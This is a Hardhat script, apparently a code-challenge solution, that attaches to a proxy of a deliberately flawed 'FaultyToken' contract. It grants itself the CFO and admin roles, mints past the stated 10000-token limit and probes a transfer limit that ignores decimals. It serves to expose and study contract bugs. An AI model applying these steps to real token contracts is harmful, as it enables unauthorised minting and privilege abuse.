const { ethers } = require("hardhat");
const { ftx, fmtFtx, DEFAULT_ADMIN_ROLE, CFO_ROLE, ack } = require("../lib/ftx");

const CodeChallengeProxy = '0x1EDC21c25B2b5ae396637f028f4fFea831F4eDd9';

async function main() {
  const [sebastian1, sebastian2] = await ethers.getSigners();
  const FaultyTokenV1 = await ethers.getContractFactory("FaultyToken");
  console.log("Connecting to FaultyToken v1...");
  const proxy = await FaultyTokenV1.attach(CodeChallengeProxy);

  console.log("Assign CFO_ROLE to Sebastian2...");
  console.log(await proxy.hasRole(CFO_ROLE, sebastian2.address));
  await proxy.grantRole(CFO_ROLE, sebastian2.address).then(ack);   // assing myself the CFO role
  console.log(await proxy.hasRole(CFO_ROLE, sebastian2.address));

  console.log("Assign DEFAULT_ADMIN_ROLE to Sebastian1...");
  console.log(await proxy.hasRole(DEFAULT_ADMIN_ROLE, sebastian1.address));
  await proxy.connect(sebastian2).grantRole(DEFAULT_ADMIN_ROLE, sebastian1.address).then(ack);   // assign myself the admin role
  console.log(await proxy.hasRole(DEFAULT_ADMIN_ROLE, sebastian1.address));

  //await proxy.grantRole(DEFAULT_ADMIN_ROLE, sebastian2.address).then(ack);   // give one address both CFO and ADMIN rights

  console.log('Total supply: ', fmtFtx(await proxy.totalSupply()));

  // minting more than 10000 tokens in a single transaction is possible
  await proxy.connect(sebastian2).mint(sebastian1.address, ftx('10001')).then(ack);
  await proxy.connect(sebastian2).mint(sebastian2.address, ftx('10001')).then(ack);

  const amount = ftx('0.000000000000009999');       // max transfer amount due to transfer limit not considering decimals()
  await proxy.transfer(sebastian2.address, amount).then(ack);

  //await proxy.connect(sebastian2).burn(sebastian2.address, ftx('1'));    // would fail, because of burn() not being external / public

  console.log('Total supply: ', fmtFtx(await proxy.totalSupply()));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
